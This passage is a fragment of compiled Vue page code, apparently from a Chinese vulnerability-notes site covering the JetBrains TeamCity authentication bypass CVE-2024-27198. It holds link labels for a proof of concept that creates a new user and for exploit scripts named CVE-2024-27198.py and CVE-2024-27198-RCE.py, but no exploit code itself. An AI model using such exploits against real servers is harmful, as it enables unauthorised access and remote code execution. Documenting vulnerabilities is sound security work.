"),n("a",q,[s("poc"),t(a)]),s(" 创建一个新用户：")]),_,n("p",null,[n("a",y,[s("CVE-2024-27198.py"),t(a)])]),h,n("p",null,[n("a",f,[s("CVE-2024-27198-RCE.py"),t(a)])]),w])}const j=e(l,[["render",x],["__file","JetBrains TeamCity 身份验证绕过漏洞  CVE-2024-27198.html.vue"]]);export{j as default};
